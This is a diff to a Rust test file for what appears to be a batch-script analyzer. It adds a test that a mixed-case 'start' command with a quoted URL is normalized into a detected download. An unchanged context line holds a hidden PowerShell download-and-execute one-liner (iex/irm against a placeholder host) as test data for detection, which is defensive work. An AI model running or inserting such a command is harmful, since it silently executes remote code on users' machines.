@@ -870,6 +870,18 @@ mod echo_tests {
     }
 
     #[test]
+    fn start_quoted_liberal_url_is_normalized() {
+        let script = b"StArT \"\" \"hTtPs:\\\\opened-liberal.example\\doc.pdf\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::Download { src, .. } if src == "https://opened-liberal.example/doc.pdf")),
+            "start liberal URL not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_browser_url_trailing_paren_is_trimmed() {
         let script =
             b"start powershell.exe -windowstyle hidden iex(irm https://start.example/p.png)\r\n";
